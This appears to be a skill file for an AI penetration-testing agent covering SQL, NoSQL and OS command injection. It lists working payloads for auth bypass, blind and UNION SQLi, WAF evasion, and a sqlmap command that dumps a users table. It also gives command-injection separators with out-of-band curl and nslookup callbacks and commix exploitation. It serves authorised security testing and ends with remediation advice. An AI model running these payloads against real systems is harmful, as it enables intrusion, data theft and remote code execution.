---
name: injection-sqli-cmdi
description: SQL injection, NoSQL injection, and OS command injection testing with payloads, detection markers, DBMS fingerprinting, WAF-evasion, and safe sqlmap/commix delegation. Use when the target has parameters that may reach a database or system command (search/filter/id/login/API bodies). OWASP A03, WSTG-INPV, CWE-89/943/78.
---

# SQLi / NoSQLi / Command Injection (Hunter Agent)

`dr(){ docker run --rm detech/toolbox:latest "$@"; }`. **Log every payload before analyzing the
response.** Manually confirm first, then delegate to sqlmap/commix.

## Prioritise by stack (from recon)
PHP/MySQL → SQLi, CMDi, SSTI · Node/Mongo → **NoSQLi**, CMDi · Java/Spring → SQLi, XXE ·
Python/Flask → SQLi, SSTI, CMDi. Test URL params, POST bodies, JSON fields, and headers
(`Cookie`, `Referer`, `X-Forwarded-For`).

## SQL injection
**Detection:**
- **Error-based:** inject `'` `"` `\` `')` → look for DB errors (MySQL syntax, `ORA-`, `PG::`,
  `SQLITE_ERROR`, ODBC). 
- **Boolean-blind:** compare `' AND 1=1-- -` (true) vs `' AND 1=2-- -` (false) — different
  length/content = injectable.
- **Time-blind:** `' AND SLEEP(5)-- -` (MySQL), `';SELECT pg_sleep(5)-- -` (PG),
  `' WAITFOR DELAY '0:0:5'-- -` (MSSQL) → delay **>5s** (rule out latency; repeat to confirm).
- **UNION:** find columns via `ORDER BY N` / `UNION SELECT NULL,NULL,...`, then extract.

**DBMS fingerprint:** MySQL `@@version`,`connection_id()` (`-- -`,`#`) · PG `version()`,`::int`
· MSSQL `@@version`,`BINARY_CHECKSUM()` · SQLite `sqlite_version()`.

**Auth bypass (login field):** `' OR '1'='1'-- -`, `admin'-- -`, `' OR 1=1#`, `") OR ("1"="1`.

**WAF evasion (see `waf-detection-bypass`):** `/**/`, `/*!50000UNION*/`, case, `%0a/%09`,
double-encoding, HPP. Always URL-encode payloads in HTTP params.

**Delegate after manual confirmation:**
```bash
dr sqlmap -u "$U/page?id=1" --batch --level=3 --risk=2 --random-agent
# if WAF: --tamper=space2comment,between,randomcase,charencode
# extract (authorized, non-destructive): --dbs --tables -D <db> --dump -T users --columns
```

## NoSQL injection (Mongo/JSON APIs)
- Auth bypass in JSON body: `{"user":{"$ne":null},"pass":{"$ne":null}}`, `{"$gt":""}`.
- Operator injection in query params: `user[$ne]=x`, `pass[$regex]=^a`.
- JS injection (where): `'; return true; var x='`. Boolean/time-blind via `$where sleep(5000)`.

## OS command injection
**Detection (in params that touch the system — ping, filename, export, pdf, convert):**
- Separators: `; id`, `| id`, `|| id`, `& id`, `&& id`, `` `id` ``, `$(id)`, `%0a id`.
- Windows: `& whoami`, `| whoami`.
- **Blind → confirm out-of-band** (`server-side-ssrf-lfi` / OOB): `; curl http://<cid>.oast/`,
  `& nslookup <cid>.oast`, or time-based `; sleep 5`.
```bash
# after manual signal, confirm/exploit:
dr commix --url="$U/ping?host=127.0.0.1" --batch
```

## Confirmation discipline (avoid FPs)
- A blind hit needs a **repeatable** delay (≥5s, confirmed 2×) or an **OOB callback** — never
  a single slow response.
- Error strings must be genuine DB/shell errors, not generic 500 pages.
- Capture the exact request + the differential/response proving it.

## Analysis & recording
Record with payload, DBMS/shell proof, exact request+response, CWE (89 SQLi / 943 NoSQLi /
78 CMDi), OWASP **A03 Injection**, CVSS (usually 9.x critical), impact (data theft, auth
bypass, RCE), remediation (**parameterised queries / prepared statements**, allow-list, least
privilege, no shell interpolation — use exec-array APIs). Pass `validation-gates`.
